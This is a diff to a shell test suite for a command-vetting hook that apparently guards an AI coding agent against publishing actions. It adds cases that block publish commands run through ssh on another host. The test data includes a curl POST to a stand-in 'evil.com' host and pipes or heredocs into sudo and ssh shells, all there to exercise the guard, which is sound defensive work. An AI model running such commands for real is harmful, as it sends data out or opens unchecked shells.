@@ -298,7 +298,7 @@ for c in 'curl -d x "http://example.com"' 'curl -d x "http://localhost.evil.com"
 done
 
 # A verb read from one piece of a quoted argument asks, and the question names the piece (#131).
-for c in 'claude "review this"' "ssh host 'npm publish'"; do
+for c in 'claude "review this"' "x host 'npm publish'"; do
   run_hook "$S" "$(jsonin "$c")"
   assert_rc 0 "$c is not refused outright"
   assert_out '"permissionDecision":"ask"' "$c asks"
@@ -355,5 +355,12 @@ assert_rc 2 "a publish verb with a redirect fused to its end blocked (#147)"
 pipe_asks 'cat x | sudo -s' "a pipe into sudo -s asks"
 run_hook "$S" "$(jsonin $'sudo -i <<EOF\ngh pr comment 1 -b x\nEOF')"
 assert_rc 2 "a publish in a heredoc fed to sudo -i blocked"
+
+# ssh runs the words after its host as a command line there, as you, and with none it starts a shell there (#113).
+run_hook "$S" "$(jsonin 'ssh host gh pr comment 1 -b x')"
+assert_rc 2 "a publish ssh runs on another host blocked"
+run_hook "$S" "$(jsonin "ssh host 'npm publish'")"
+assert_rc 2 "a quoted publish ssh runs on another host blocked"
+pipe_asks 'cat x | ssh host' "a pipe into ssh with no command asks"
 
 finish "guard-publish"
